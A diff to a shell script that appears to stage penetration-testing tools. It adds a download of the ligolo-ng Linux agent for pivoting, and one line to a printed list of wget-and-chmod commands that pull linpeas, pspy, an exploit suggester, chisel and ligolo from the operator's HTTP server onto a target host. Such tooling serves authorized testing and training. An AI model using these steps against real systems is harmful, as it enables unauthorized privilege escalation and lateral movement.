@@ -201,6 +201,19 @@ ARCH=$(uname -m); [ "$ARCH" = "x86_64" ] && ARCH="amd64"
     fi
 }
 
+# Ligolo agent (linux) - linux pivot host için
+[ ! -f "$TOOLS/ligolo_agent_linux" ] && {
+    URL=$(gh_latest "nicocha30/ligolo-ng" "agent_Linux_64")
+    if [ -n "$URL" ]; then
+        TMP=$(mktemp --suffix=.tar.gz)
+        curl -sL -o "$TMP" "$URL"
+        tar xzf "$TMP" -C "$TOOLS/" 2>/dev/null
+        AGENT=$(find "$TOOLS" -maxdepth 1 -name "agent" -type f | head -1)
+        [ -n "$AGENT" ] && mv "$AGENT" "$TOOLS/ligolo_agent_linux" && chmod +x "$TOOLS/ligolo_agent_linux" && ok "ligolo-ng agent (linux)" || fail "ligolo-ng agent (linux)"
+        rm -f "$TMP"
+    fi
+}
+
 # Ligolo agent (windows)
 [ ! -f "$TOOLS/ligolo_agent.exe" ] && {
     URL=$(gh_latest "nicocha30/ligolo-ng" "agent_Windows_64")
@@ -307,6 +320,7 @@ echo "  wget http://$IP:$PORT/linpeas.sh && chmod +x linpeas.sh"
 echo "  wget http://$IP:$PORT/pspy64 && chmod +x pspy64"
 echo "  wget http://$IP:$PORT/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh"
 echo "  wget http://$IP:$PORT/chisel_linux && chmod +x chisel_linux"
+echo "  wget http://$IP:$PORT/ligolo_agent_linux && chmod +x ligolo_agent_linux"
 echo "  wget http://$IP:$PORT/ligolo_proxy && chmod +x ligolo_proxy"
 echo ""
 cd "$(dirname "$0")" && python3 -m http.server $PORT
